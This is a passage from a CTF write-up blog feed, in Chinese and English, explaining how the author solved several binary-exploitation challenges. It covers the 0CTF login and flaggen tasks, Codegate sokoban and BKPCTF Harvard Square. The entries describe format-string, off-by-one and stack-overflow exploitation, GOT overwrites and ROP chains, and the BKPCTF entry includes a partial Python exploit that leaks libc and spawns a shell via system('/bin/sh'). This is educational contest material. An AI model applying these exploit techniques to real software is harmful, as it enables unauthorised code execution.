我們可以將 &lt;code&gt;__stack_chk_fail()&lt;/code&gt; 在 GOT 上的值指向 &lt;code&gt;ret&lt;/code&gt;&lt;br&gt;
程式就不會因為 &lt;em&gt;detect overflow&lt;/em&gt; 而結束  &lt;/p&gt;
&lt;p&gt;剩下就是寫 exploit 了&lt;br&gt;
由於這題有使用到 &lt;code&gt;puts()&lt;/code&gt;&lt;br&gt;
所以可以透過 &lt;code&gt;puts()&lt;/code&gt; 去 leak 出 &lt;strong&gt;libc base&lt;/strong&gt;&lt;br&gt;
但是因為改 &lt;code&gt;__stack_chk_fail()&lt;/code&gt; GOT 的同時也把其他 function 的 GOT 改壞了&lt;br&gt;
就沒辦法跳回 &lt;code&gt;main()&lt;/code&gt; 再觸發一次 bof&lt;br&gt;
所以改成 return 到 &lt;code&gt;readn()&lt;/code&gt; 將新的 rop payload 寫到 &lt;strong&gt;bss&lt;/strong&gt; 段&lt;br&gt;
最後透過 &lt;code&gt;leave&lt;/code&gt; 將 stack 給換到 bss 段繼續我們的 rop attack&lt;br&gt;
就可以成功拿到 shell 了 ~  &lt;/p&gt;
&lt;p&gt;exploit: &lt;a href="https://ddaa.tw/exp/flaggen.py"&gt;flaggen.py&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;0ctf{delicious_stack_cookie_generates_flag}&lt;/code&gt;  &lt;/p&gt;</content><category term="XCTF"></category><category term="Stack Overflow"></category></entry><entry><title>0CTF 2015 Exploit 300 login</title><link href="https://ddaa.tw/0ctf_exploit_300_login.html" rel="alternate"></link><published>2015-04-03T00:00:00+08:00</published><updated>2015-04-03T00:00:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-04-03:/0ctf_exploit_300_login.html</id><summary type="html">&lt;p&gt;這題跟 &lt;strong&gt;yench&lt;/strong&gt; 討論&lt;br&gt;
至少省下我一個小時突破盲點 XD&lt;br&gt;
上學期辛苦開程式安全終於感覺有回饋了 QQ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題是考 &lt;strong&gt;format string vulnerability&lt;/strong&gt;&lt;br&gt;
執行程式要我們輸入帳密&lt;br&gt;
打開 &lt;strong&gt;ida pro&lt;/strong&gt; 很容易就知道帳密多少&lt;br&gt;
輸入 &lt;em&gt;guest / guest123&lt;/em&gt; 以後成功登入&lt;br&gt;
接著有三個功能可以選擇:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;== 0CTF Login System ==&lt;br&gt;
1. Show Profile&lt;br&gt;
2. Login as User&lt;br&gt;
3. Logout&lt;br&gt;
=======================&lt;br&gt;
Your choice:  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;但其實還有一個隱藏功能 &lt;em&gt;4&lt;/em&gt;&lt;br&gt;
必須讓自己的身分變成 &lt;em&gt;normal&lt;/em&gt; 才能觸發&lt;br&gt;
功能 4 是登入成 &lt;em&gt;root&lt;/em&gt; 的功能&lt;br&gt;
裡面有兩個很明顯的 &lt;code&gt;printf(buf)&lt;/code&gt;&lt;br&gt;
所以首先我們要讓自己的身份從 &lt;em&gt;guest …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;這題跟 &lt;strong&gt;yench&lt;/strong&gt; 討論&lt;br&gt;
至少省下我一個小時突破盲點 XD&lt;br&gt;
上學期辛苦開程式安全終於感覺有回饋了 QQ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題是考 &lt;strong&gt;format string vulnerability&lt;/strong&gt;&lt;br&gt;
執行程式要我們輸入帳密&lt;br&gt;
打開 &lt;strong&gt;ida pro&lt;/strong&gt; 很容易就知道帳密多少&lt;br&gt;
輸入 &lt;em&gt;guest / guest123&lt;/em&gt; 以後成功登入&lt;br&gt;
接著有三個功能可以選擇:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;== 0CTF Login System ==&lt;br&gt;
1. Show Profile&lt;br&gt;
2. Login as User&lt;br&gt;
3. Logout&lt;br&gt;
=======================&lt;br&gt;
Your choice:  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;但其實還有一個隱藏功能 &lt;em&gt;4&lt;/em&gt;&lt;br&gt;
必須讓自己的身分變成 &lt;em&gt;normal&lt;/em&gt; 才能觸發&lt;br&gt;
功能 4 是登入成 &lt;em&gt;root&lt;/em&gt; 的功能&lt;br&gt;
裡面有兩個很明顯的 &lt;code&gt;printf(buf)&lt;/code&gt;&lt;br&gt;
所以首先我們要讓自己的身份從 &lt;em&gt;guest&lt;/em&gt; 變成 &lt;em&gt;normal&lt;/em&gt;&lt;br&gt;
pseudo code 大概長這樣:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;char user[256];
int64 mode;
...
if ( choice == 4 &amp;amp;&amp;amp; !mode)
    root_login()
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;em&gt;Login as User&lt;/em&gt; 利用 &lt;code&gt;scanf("%256s", user)&lt;/code&gt; 取得 &lt;code&gt;user&lt;/code&gt;&lt;br&gt;
乍看之下是剛好 但是 &lt;code&gt;scanf("%s")&lt;/code&gt; 的特性會在字串結尾補上 &lt;em&gt;\00&lt;/em&gt;&lt;br&gt;
因此會有 &lt;strong&gt;off-by-one&lt;/strong&gt; 的問題&lt;br&gt;
因此只要輸入長度 256 的 &lt;code&gt;user&lt;/code&gt; 即可讓身份變為 &lt;em&gt;normal&lt;/em&gt;  &lt;/p&gt;
&lt;p&gt;進入 &lt;code&gt;root_login()&lt;/code&gt; 以後的行為如下:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;readn(user, 256);
pw = md5(readn(pw, 256));
if (user == &amp;quot;root&amp;quot; &amp;amp;&amp;amp; pw == &amp;quot;0ops{secret_MD5}&amp;quot;)
    cat_flag();
printf(user);
puts(&amp;quot;login failed.&amp;quot;);
...
/* 2 chances */
...
exit(1);
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;登入失敗會用 &lt;code&gt;printf(user)&lt;/code&gt; 印出使用者名稱&lt;br&gt;
一個非常明顯的 &lt;strong&gt;Format String&lt;/strong&gt;&lt;br&gt;
我一開始以為 binary 中的 &lt;em&gt;0ops{secret md5}&lt;/em&gt; 是被替換掉的&lt;br&gt;
真實環境會放真的 md5 ... 只要 leak 出密碼就過了&lt;br&gt;
後來試一下才發現那個字串真的就是那樣 = =&lt;br&gt;
md5 的結果是 hex string 的形式&lt;br&gt;
所以不可能滿足條件 XD  &lt;/p&gt;
&lt;p&gt;由於最後會用 &lt;code&gt;exit(1)&lt;/code&gt; 結束程式&lt;br&gt;
沒辦法透過改 ret address 去控制程式&lt;br&gt;
所以很直覺的會想改 &lt;code&gt;exit()&lt;/code&gt; 的 GOT&lt;br&gt;
但是寫完 exploit 才發現這題的 GOT 竟然是 &lt;em&gt;read-only&lt;/em&gt; XDDD&lt;br&gt;
不確定是因為 &lt;strong&gt;PIE&lt;/strong&gt; 的緣故或是有開啟其他保護機制  &lt;/p&gt;
&lt;p&gt;乍看之下無技可施了&lt;br&gt;
正當我在嘗試研究 &lt;code&gt;memcpy()&lt;/code&gt; 內部的是不是有可以利用的同時&lt;br&gt;
&lt;strong&gt;yench&lt;/strong&gt; 提醒我能不能改 &lt;code&gt;printf()&lt;/code&gt; 的 rbp 去控制程式&lt;br&gt;
結果是沒辦法~ 因為 &lt;code&gt;printf()&lt;/code&gt; 最後沒有 leave&lt;br&gt;
但是這讓我想起去年 &lt;strong&gt;HITCON&lt;/strong&gt; 的某一題&lt;br&gt;
是利用 &lt;code&gt;sprinf()&lt;/code&gt; 任意改值造成 overflow 的二次利用&lt;br&gt;
果然這題也是類似的做法&lt;br&gt;
由於實際發生 &lt;strong&gt;Format String&lt;/strong&gt; 是在 printf 內部的 &lt;code&gt;vprintf()&lt;/code&gt;&lt;br&gt;
因此可以將 &lt;code&gt;printf()&lt;/code&gt; 的 return address 給改掉  &lt;/p&gt;
&lt;p&gt;有兩次 &lt;code&gt;printf()&lt;/code&gt; 可以利用&lt;br&gt;
因此只要第一次 leak 出 &lt;strong&gt;libc base&lt;/strong&gt; 以及 &lt;strong&gt;stack base&lt;/strong&gt;&lt;br&gt;
第二次可以做 rop 攻擊&lt;br&gt;
改 ret 跳到 &lt;code&gt;pop rdi&lt;/code&gt; 再到 &lt;code&gt;system()&lt;/code&gt; 就拿到這題的 shell 了~  &lt;/p&gt;
&lt;p&gt;exploit: &lt;a href="https://ddaa.tw/exp/login.py"&gt;login.py&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;0ctf{login_success_and_welcome_back}&lt;/code&gt;  &lt;/p&gt;</content><category term="XCTF"></category><category term="Off-by-one"></category><category term="Format String"></category></entry><entry><title>Codegate CTF 2015 pwn 1000 sokoban</title><link href="https://ddaa.tw/codegate_pwn_1000_sokoban.html" rel="alternate"></link><published>2015-03-24T12:55:00+08:00</published><updated>2015-03-24T12:55:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-03-24:/codegate_pwn_1000_sokoban.html</id><summary type="html">&lt;p&gt;The challenge is a game that called &lt;strong&gt;sokoban&lt;/strong&gt;. lol&lt;br&gt;
After we passed the first levels, we entered a menu and were able to choose the game mode.  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;The menu looked like:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;Go to random infinite challenge mode  &lt;/li&gt;
&lt;li&gt;Go to next stage  &lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;Next, we opened IDA pro and reversed the binary …&lt;/p&gt;</summary><content type="html">&lt;p&gt;The challenge is a game that called &lt;strong&gt;sokoban&lt;/strong&gt;. lol&lt;br&gt;
After we passed the first levels, we entered a menu and were able to choose the game mode.  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;The menu looked like:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;Go to random infinite challenge mode  &lt;/li&gt;
&lt;li&gt;Go to next stage  &lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;Next, we opened IDA pro and reversed the binary.&lt;br&gt;
We could easily find the code like:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;if (playgame() == 1)
    get_flag();
puts(s);
return;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then we traced how is the return value assigned......  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;// just pseudo code
if (win)
  passed++;
return (passed == 228) ? 2 : 0;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;228 is the amount of all levels.&lt;br&gt;
It seems impossible to arrive &lt;code&gt;get_flag()&lt;/code&gt;. XD&lt;br&gt;
But our goal is very clear, &lt;strong&gt;control the EIP and go to &lt;code&gt;get_flag()&lt;/code&gt;&lt;/strong&gt;.  &lt;/p&gt;
&lt;p&gt;We accidentally found the game sometimes generates a blank map in random mode then checks the rule of movement, it restricts the character by the element in the map, not the size of map.&lt;br&gt;
Therefore, once we could get the blank map, we were able to move the character to anyware in &lt;strong&gt;bss segment&lt;/strong&gt; and &lt;strong&gt;GOT segment&lt;/strong&gt;.  &lt;/p&gt;
&lt;p&gt;There is the defination of elements:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;\x00: nothing&lt;/li&gt;
&lt;li&gt;\x01: destination of box&lt;/li&gt;
&lt;li&gt;\x02: wall&lt;/li&gt;
&lt;li&gt;other: it's not important.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;According to the rule of sokoban, we could push a byte onto &lt;code&gt;\x00&lt;/code&gt; or &lt;code&gt;\x01&lt;/code&gt;.&lt;br&gt;
It's very difficult to use......&lt;br&gt;
I tried to move the content of GOT at first, but I found GOT looks like:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href="&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#116;&amp;#105;&amp;#109;&amp;#101;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;"&gt;&amp;#116;&amp;#105;&amp;#109;&amp;#101;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;&lt;/a&gt;:        0xf7ffafa0      0x00007fff      0x00400dd6      0x00000000&lt;br&gt;
&lt;a href="&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#119;&amp;#103;&amp;#101;&amp;#116;&amp;#99;&amp;#104;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;"&gt;&amp;#119;&amp;#103;&amp;#101;&amp;#116;&amp;#99;&amp;#104;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;&lt;/a&gt;:      0xf7bc2f90      0x00007fff      0x00400df6      0x00000000&lt;br&gt;
&lt;a href="&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#110;&amp;#111;&amp;#101;&amp;#99;&amp;#104;&amp;#111;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;"&gt;&amp;#110;&amp;#111;&amp;#101;&amp;#99;&amp;#104;&amp;#111;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;&lt;/a&gt;:      0xf7bc0a50      0x00007fff      0x00400e16      0x00000000&lt;br&gt;
&lt;a href="&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#119;&amp;#109;&amp;#111;&amp;#118;&amp;#101;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;"&gt;&amp;#119;&amp;#109;&amp;#111;&amp;#118;&amp;#101;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;&lt;/a&gt;:       0xf7bc4e40      0x00007fff      0xf799de70      0x00007fff&lt;br&gt;
&lt;a href="&amp;#109;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#109;&amp;#118;&amp;#112;&amp;#114;&amp;#105;&amp;#110;&amp;#116;&amp;#119;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;"&gt;&amp;#109;&amp;#118;&amp;#112;&amp;#114;&amp;#105;&amp;#110;&amp;#116;&amp;#119;&amp;#64;&amp;#103;&amp;#111;&amp;#116;&amp;#46;&amp;#112;&amp;#108;&amp;#116;&lt;/a&gt;:    0xf7bc7db0      0x00007fff      0xf7bc0ad0      0x00007fff  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Almost all bytes are adjacent to each other.&lt;br&gt;
Therefore, we couldn't change the GOT area at most situation except ASLR was enable.&lt;br&gt;
For example, it's possible to make a libc address likes &lt;strong&gt;0x7fffff00xx&lt;/strong&gt;.&lt;br&gt;
So we could modify a byte on GOT to somewhere in libc.  &lt;/p&gt;
&lt;p&gt;Still seem useless....&lt;br&gt;
But after I checked all possible gadgets, I found a magic gadget at &lt;strong&gt;0x3e260&lt;/strong&gt;.&lt;br&gt;
That is &lt;code&gt;add rsp, 0x28; (pop XX)*6; ret&lt;/code&gt;.&lt;br&gt;
Furthermore, the address of &lt;code&gt;rand()&lt;/code&gt; is &lt;strong&gt;0x3d060&lt;/strong&gt;.&lt;br&gt;
If we modify &lt;code&gt;rand()&lt;/code&gt; to that magic gadget, the return address is &lt;strong&gt;0x401a9a&lt;/strong&gt; after we execute &lt;code&gt;rand()&lt;/code&gt; again.&lt;br&gt;
Luckily, there are a hidden function in the game.&lt;br&gt;
If we press &lt;code&gt;v&lt;/code&gt;, it will add 0x12 on &lt;strong&gt;0x60c120&lt;/strong&gt;.&lt;br&gt;
And, 0x3e260 - 0x3d060 = 0x12......  &lt;/p&gt;
&lt;p&gt;So, hence we had already bypassed the action of assign value to &lt;code&gt;EAX&lt;/code&gt;.&lt;br&gt;
If we could control &lt;code&gt;EAX&lt;/code&gt; and set &lt;code&gt;EAX = 1&lt;/code&gt;, we entered the function &lt;code&gt;get_flag()&lt;/code&gt;.&lt;br&gt;
Lucklily, if the argument of wgetch is \x00, the return value will be 1.&lt;br&gt;
On x86 architecture, the return value will be stored in &lt;code&gt;EAX&lt;/code&gt;.&lt;br&gt;
&lt;code&gt;EAX&lt;/code&gt; won't be modified until we call &lt;code&gt;rand()&lt;/code&gt;.&lt;br&gt;
Finally, the program will print the flag. :)  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;WH0n in OOme, ZZ as 12e RolanS&lt;/code&gt;  &lt;/p&gt;</content><category term="Codegate CTF"></category><category term="Off-by-one"></category></entry><entry><title>Boston Key Party CTF 2015 Pwn 275 Harvard Square</title><link href="https://ddaa.tw/bkpctf_pwn_275_harvard_square.html" rel="alternate"></link><published>2015-03-02T01:50:00+08:00</published><updated>2015-03-02T01:50:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-03-02:/bkpctf_pwn_275_harvard_square.html</id><summary type="html">&lt;p&gt;This problem was worth 275 pts, but I thought it is easier than other red problems. XD&lt;br&gt;
We could reverse it happily beacuse the programe wasn't stipped.  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;The problem is a game about transcation of 0days.&lt;br&gt;
We could enter the password and cheated the game, but it's useless. XD&lt;br&gt;
After …&lt;/p&gt;</summary><content type="html">&lt;p&gt;This problem was worth 275 pts, but I thought it is easier than other red problems. XD&lt;br&gt;
We could reverse it happily beacuse the programe wasn't stipped.  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;The problem is a game about transcation of 0days.&lt;br&gt;
We could enter the password and cheated the game, but it's useless. XD&lt;br&gt;
After executing the binary, the game printed the message:  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Welcome to 0day Warz - The goal of the game is to get the $100M USD by the end of the game. You have been given a loan of $2000, with some high interest rate of 25% a day!  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The program for the goal of game:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;void play_game() {
    ...
    if (owed == 0.0) {
        if (money &amp;gt; 9999999)
      action_hiscore();
    }
  ...
}
void action_hiscore() {
    char buf[268];
  ....
  read(0, buf, 0x400);
  ...
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;However, if understood the game rule, we could know the condition is impossible to reach.&lt;br&gt;
So we must find another vulunerbility.&lt;br&gt;
In fact, there is a bof when &lt;code&gt;play_game()&lt;/code&gt; starting.&lt;br&gt;
It couldn't overflow the return address, but we could use it to change function pointers. :D  &lt;/p&gt;
&lt;p&gt;The program use &lt;a href="https://github.com/dhamidi/simple-gc/"&gt;simple-gc&lt;/a&gt;.&lt;br&gt;
It will create two garbage-collectors and put function pointer &lt;code&gt;exploit_free&lt;/code&gt; and &lt;code&gt;string_free&lt;/code&gt; to gc.&lt;br&gt;
Then, gc will trigger when we do &lt;code&gt;sleep&lt;/code&gt; action.&lt;br&gt;
We could overwrite function ptr to &lt;code&gt;action_hiscore&lt;/code&gt;, and we could overwrite the return address.  &lt;/p&gt;
&lt;p&gt;We could write the exploit until now.&lt;br&gt;
Honestly, I am not familar with x64 architecture exploit.&lt;br&gt;
I wasted a lot of time to debug my code. :(  &lt;/p&gt;
&lt;p&gt;By the way, args on x64 is in register.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;arg1 =&amp;gt; rdi
arg2 =&amp;gt; rsi
arg3 =&amp;gt; rdx
arg4 =&amp;gt; r8
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So we must find some gadget to control arguments at first.&lt;br&gt;
Then, we could use &lt;code&gt;put()&lt;/code&gt; to leak arbitrary address.&lt;br&gt;
There exist a little bug.... stdout dupped to socket.&lt;br&gt;
We won't receive the content immediately.&lt;br&gt;
To solve this bug, I returned to &lt;code&gt;action_hiscore()&lt;/code&gt; again because there is &lt;code&gt;fflush()&lt;/code&gt; at the end of function.  &lt;/p&gt;
&lt;p&gt;After leaked the address, we could calulate the address of &lt;code&gt;system()&lt;/code&gt;.&lt;br&gt;
Next, We needed a string of "/bin/sh".&lt;br&gt;
Luckily, we could find it in libc, too. XD&lt;br&gt;
So we couldn execute &lt;code&gt;system("/bin/sh")&lt;/code&gt; to get the shell.  &lt;/p&gt;
&lt;p&gt;My partitial exploit:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# leak address&lt;/span&gt;
&lt;span class="nf"&gt;raw_input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;wait gdb&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nf"&gt;read_until&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name? &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="s s-Atom"&gt;pop_rdi&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;up64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;402fc3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="s s-Atom"&gt;got&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;up64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;605061&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="s s-Atom"&gt;put&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;up64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;400cd0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="s s-Atom"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;280&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s s-Atom"&gt;pop_rdi&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s s-Atom"&gt;got&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s s-Atom"&gt;put&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s s-Atom"&gt;bof&lt;/span&gt;
&lt;span class="nf"&gt;send_line&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s s-Atom"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nf"&gt;read_until&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;...-&amp;#39;\&amp;quot;\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nf"&gt;read_until&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;!\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# get leak and count libc&lt;/span&gt;
&lt;span class="s s-Atom"&gt;leak&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;read_line&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="nf"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="s s-Atom"&gt;::-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nf"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hex&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="s s-Atom"&gt;base&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s s-Atom"&gt;leak+&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;00&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mh"&gt;0x54400&lt;/span&gt;
&lt;span class="s s-Atom"&gt;system&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s s-Atom"&gt;base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x46640&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="s s-Atom"&gt;:&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="s s-Atom"&gt;system&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;up64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s s-Atom"&gt;system&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="s s-Atom"&gt;binsh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;hex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s s-Atom"&gt;base&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x17d87b&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="s s-Atom"&gt;:&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="c1"&gt;# get and shell out&lt;/span&gt;
&lt;span class="nf"&gt;read_until&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name? &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="s s-Atom"&gt;buf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nf"&gt;up64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;605800&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="s s-Atom"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;280&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s s-Atom"&gt;pop_rdi&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nf"&gt;up64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s s-Atom"&gt;binsh&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s s-Atom"&gt;system&lt;/span&gt;
&lt;span class="nf"&gt;send_line&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s s-Atom"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nf"&gt;read_until&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;!\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="s s-Atom"&gt;t&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;interact&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;flag: &lt;code&gt;stay_in_school_and_dont_do_the_grugq&lt;/code&gt;  &lt;/p&gt;</content><category term="BKPCTF"></category><category term="Stack Overflow"></category></entry><entry><title>9447 CTF 2014 pwn 420 classy</title><link href="https://ddaa.tw/9447ctf_pwn_420_classy.html" rel="alternate"></link><published>2014-12-04T14:22:00+08:00</published><updated>2014-12-04T14:22:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-12-04:/9447ctf_pwn_420_classy.html</id><summary type="html">&lt;p&gt;這題看了十個小時多卻沒解出來&lt;br&gt;
實在是很挫敗......&lt;br&gt;
不過還是覺得這題該寫個 write up 紀錄&lt;br&gt;
下次才不會一樣進入思維誤區  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題是 binary 是用 C++ 寫的&lt;br&gt;
